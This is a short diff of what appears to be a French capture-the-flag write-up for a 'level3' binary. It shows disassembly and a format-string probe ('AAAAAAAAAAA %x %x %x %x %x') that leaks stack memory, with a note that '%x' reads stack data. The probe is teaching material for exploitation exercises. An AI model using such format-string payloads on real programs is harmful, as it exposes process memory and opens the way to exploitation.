@@ -53,7 +53,7 @@
     0x08048519 <+117>:   ret    
 
 > ./level3
-    >AAAAAAAAAAA %x %x %x %x
+    >AAAAAAAAAAA %x %x %x %x %x
         AAAAAAAAAAA 200 b7fd1ac0 b7ff37d0 41414141 41414141
 
 Ici on utilise '%x' pour lire la data dans la stack.
